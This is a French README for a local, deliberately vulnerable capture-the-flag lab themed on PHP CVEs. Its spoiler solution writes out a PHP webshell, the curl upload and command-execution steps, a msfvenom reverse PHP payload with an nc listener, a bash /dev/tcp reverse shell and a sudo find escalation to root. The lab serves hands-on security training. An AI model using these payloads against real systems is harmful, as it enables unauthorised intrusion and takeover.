# 📁 php2shell — Easy

| | |
|---|---|
| **Difficulté** | Easy |
| **Catégorie** | Web / PHP |
| **Thème CVE** | [CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) · [CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) (« php2shell ») |
| **Service** | HTTP (Apache + PHP) sur `http://127.0.0.1:8080` |
| **Objectifs** | 🏴 `user.txt` (foothold) · 🏴 `root.txt` (privesc) |

## Scénario

Une petite appli interne de partage de fichiers, **FileDrop**, tourne sur un
serveur dont la version de PHP est **antérieure aux correctifs php2shell**.
Deux choses à exploiter : un service web mal codé, et un système mal durci.

## Méthodo conseillée (essaie d'abord seul 👇)

1. **Recon** — qu'est-ce qui tourne, quelle version ?
   ```bash
   curl -I http://127.0.0.1:8080/
   # (ou depuis Kali après 'docker network connect vulnforge-net htb-kali')
   nmap -sV -p80 php2shell
   ```
2. **Fingerprint & recherche** — note la version de PHP dans les en-têtes
   (`X-Powered-By`) et le footer. Est-elle vulnérable à php2shell ? À quoi
   d'autre ? (voir la section CVE plus bas).
3. **Foothold** — explore l'appli. Comment un fichier déposé est-il stocké,
   et surtout **servi** ? Que se passe-t-il si ce fichier est du code ?
4. **Privesc** — une fois un shell `www-data`, regarde ce que tu as le droit de
   faire (`sudo -l`). Classique.

> Bloqué ? Déplie la solution ci-dessous. Mais la vraie compétence, c'est la
> méthodo, pas le flag.

---

<details>
<summary><b>💡 Solution complète (spoilers)</b></summary>

### 1. Recon / fingerprint
```bash
curl -I http://127.0.0.1:8080/
#   Server: Apache/2.4.x (Debian)
#   X-Powered-By: PHP/8.3.10        <-- < 8.3.36  => vulnérable php2shell
```
La version est antérieure aux correctifs → le serveur est *théoriquement*
exposé à php2shell. Dans ce lab, on prend la voie plus propre et universelle :
le web.

### 2. Foothold — upload non filtré → webshell → RCE
L'endpoint `upload.php` ne filtre **ni l'extension ni le type**, et `uploads/`
est servi *et exécuté* par Apache. On dépose donc un webshell PHP.

```bash
# un webshell minimal
echo '<?php system($_GET["c"]); ?>' > shell.php

# upload via le formulaire (champ "file")
curl -s -F "file=@shell.php" http://127.0.0.1:8080/upload.php -o /dev/null

# exécution de commandes
curl -s "http://127.0.0.1:8080/uploads/shell.php?c=id"
#   uid=33(www-data) gid=33(www-data) ...
curl -s "http://127.0.0.1:8080/uploads/shell.php?c=cat+/var/www/user.txt"   # 🏴 user.txt
```

Variante **msfvenom** (rappel de notre discussion) — payload PHP + handler :
```bash
msfvenom -p php/reverse_php LHOST=<ton_ip> LPORT=4444 -f raw > rev.php
# upload rev.php, mettre 'nc -lvnp 4444' ou multi/handler en écoute, puis l'appeler
curl -s "http://127.0.0.1:8080/uploads/rev.php"
```
Pour un vrai shell interactif depuis le webshell :
```bash
curl -s "http://127.0.0.1:8080/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ip>/4444+0>%261'"
```

### 3. Privesc — sudo find (GTFOBins) → root
```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh -p \; -quit        # shell root
# ... ou directement lire le flag :
sudo find /root/root.txt -exec cat {} \;      # 🏴 root.txt
```
Réf. : <https://gtfobins.github.io/gtfobins/find/>

### Remise à zéro
```bash
../../vulnforge reset php2shell   # régénère les flags et l'état
```
</details>

---

## À propos du *vrai* exploit php2shell (les CVE mémoire)

Sois au clair sur ce que cette box fait **et ne fait pas** :

- **Ce qu'elle reproduit fidèlement** : une version de PHP réellement
  antérieure aux correctifs, pour t'entraîner au **fingerprint** et à la
  **recherche de CVE** — l'étape que fait tout pentester avant d'exploiter.
- **Le foothold jouable ici** est la faille web générique (upload → webshell),
  parce que c'est **la** technique « php → shell » à maîtriser en débutant, et
  qu'elle est pédagogique et universelle.

CVE-2026-109618 / -109619, elles, sont des **corruptions mémoire du cœur de
PHP** (OOM `longjmp()` laissant de la mémoire non initialisée ; état global
pointant vers de la mémoire libérée) menant à une RCE *non authentifiée*. Elles
sont **au catalogue CISA KEV** (exploitées dans la nature) et leur exploitation
réelle = bypass ASLR, grooming du tas, etc.

👉 **Ce lab ne fournit pas d'exploit mémoire armé** pour ces CVE : ce serait du
code offensif prêt à l'emploi contre une faille activement exploitée, sans
valeur pédagogique pour un débutant. Pour les **étudier**, lis les sources
publiques et, si tu veux manipuler un PoC, fais-le dans une VM jetable, isolée
du réseau, avec snapshot — et en lisant le code avant de l'exécuter :

- Advisories PHP : [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) · [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- Analyse : [Wiz — php2shell RCE](https://www.wiz.io/blog/php2shell-php-rce)
- CISA KEV : <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>

**Correctif** : PHP ≥ 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. Mitigation temporaire
du vecteur 109618 : `session.upload_progress.enabled = Off` dans `php.ini`.

---

> ⚠️ Machine volontairement vulnérable, à usage **local** uniquement. Ne jamais
> l'exposer à un réseau. Les techniques apprises ne s'emploient que sur des
> cibles autorisées.
